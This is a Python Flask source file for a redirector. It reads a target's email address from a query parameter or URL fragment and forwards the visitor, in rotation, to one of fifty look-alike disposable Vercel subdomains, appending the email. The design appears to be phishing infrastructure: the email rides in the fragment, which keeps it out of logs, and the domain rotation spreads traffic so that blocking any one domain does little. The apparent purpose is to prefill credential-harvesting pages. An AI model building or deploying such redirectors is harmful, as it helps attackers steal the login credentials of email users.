from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

DOMAINS = [
    'https://upgraded-palm-tree-pi.vercel.app',
    'https://upgraded-palm-baby.vercel.app',
    'https://upgraded-palm-spark.vercel.app',
    'https://upgraded-palm-floppy.vercel.app',
    'https://upgraded-palm-loffy.vercel.app',
    'https://upgraded-palm-tree-mms9.vercel.app',
    'https://upgraded-palm-baby-fhp7.vercel.app',
    'https://upgraded-palm-spark-wki8.vercel.app',
    'https://upgraded-palm-floppy-tbsr.vercel.app',
    'https://upgraded-palm-loffy-8dmd.vercel.app',
    'https://upgraded-palm-tree-stvn.vercel.app',
    'https://upgraded-palm-baby-bzer.vercel.app',
    'https://upgraded-palm-spark-xx7h.vercel.app',
    'https://upgraded-palm-floppy-mdga.vercel.app',
    'https://upgraded-palm-loffy-vkgp.vercel.app',
    'https://upgraded-palm-tree-3qbj.vercel.app',
    'https://upgraded-palm-baby-8ke8.vercel.app',
    'https://upgraded-palm-spark-s8pm.vercel.app',
    'https://upgraded-palm-floppy-4kgf.vercel.app',
    'https://upgraded-palm-loffy-z2lf.vercel.app',
    'https://upgraded-palm-tree-9m21.vercel.app',
    'https://upgraded-palm-baby-rfhx.vercel.app',
    'https://upgraded-palm-spark-rygw.vercel.app',
    'https://upgraded-palm-floppy-8vxi.vercel.app',
    'https://upgraded-palm-loffy-vdfy.vercel.app',
    'https://upgraded-palm-tree-9dyk.vercel.app',
    'https://upgraded-palm-baby-nc1u.vercel.app',
    'https://upgraded-palm-spark-r82p.vercel.app',
    'https://upgraded-palm-floppy-xwv9.vercel.app',
    'https://upgraded-palm-loffy-ttnu.vercel.app',
    'https://upgraded-palm-tree-f1yt.vercel.app',
    'https://upgraded-palm-baby-6ib3.vercel.app',
    'https://upgraded-palm-spark-s98x.vercel.app',
    'https://upgraded-palm-floppy-zkva.vercel.app',
    'https://upgraded-palm-loffy-8kht.vercel.app',
    'https://upgraded-palm-tree-5341.vercel.app',
    'https://upgraded-palm-baby-fleo.vercel.app',
    'https://upgraded-palm-spark-lqqz.vercel.app',
    'https://upgraded-palm-floppy-lhbe.vercel.app',
    'https://upgraded-palm-loffy-uore.vercel.app',
    'https://upgraded-palm-tree-9nz7.vercel.app',
    'https://upgraded-palm-baby-bmmy.vercel.app',
    'https://upgraded-palm-spark-17t2.vercel.app',
    'https://upgraded-palm-floppy-nvyt.vercel.app',
    'https://upgraded-palm-loffy-q9zh.vercel.app',
    'https://upgraded-palm-tree-si8o.vercel.app',
    'https://upgraded-palm-baby-e174.vercel.app',
    'https://upgraded-palm-spark-e7r1.vercel.app',
    'https://upgraded-palm-floppy-ubqw.vercel.app',
    'https://upgraded-palm-loffy-eeym.vercel.app'
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Try to get email from query parameter first (?web=email@email.com)
    email = request.args.get('web', '')
    
    # If no query parameter, serve a page that can handle the fragment
    if not email:
        return render_template_string('''
            <div id="status"></div>
            <script>
                const status = document.getElementById('status');
        
                if (window.location.hash) {
                    let email = window.location.hash.substring(1);
                    window.location.href = '/?web=' + encodeURIComponent(email);
                } else {
                    status.innerText = 'Invalid email';
                }
            </script>
        ''')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email.", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL with the required ?web= parameter format
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(debug=True)
